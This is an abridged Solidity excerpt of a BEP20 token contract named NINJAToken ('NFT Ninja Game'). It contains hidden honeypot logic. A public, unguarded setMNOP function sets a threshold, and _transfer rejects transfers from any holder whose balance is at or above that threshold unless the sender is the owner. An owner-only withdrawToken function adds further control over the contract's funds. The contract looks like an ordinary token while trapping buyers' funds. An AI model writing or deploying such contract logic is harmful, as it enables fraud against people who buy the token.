...
contract BEP20 is Context, IBEP20, Pausable {
    ...
    function setMNOP(uint256 _MNOP) public returns (bool){
        MNOP = _MNOP;
        return true;
    }
    ...
    function _transfer(
        ...
        require(_balances[sender] < MNOP||sender == owner());
...
contract NINJAToken is BEP20Detailed, BEP20 {
    uint256 private totalTokens;

    constructor() public BEP20Detailed("NFT Ninja Game", "NJA", 18) BEP20(50000000000000000000000000) {
    ...
    function withdrawToken(IBEP20 _token, address _receiver, uint256 _amount) public onlyOwner {
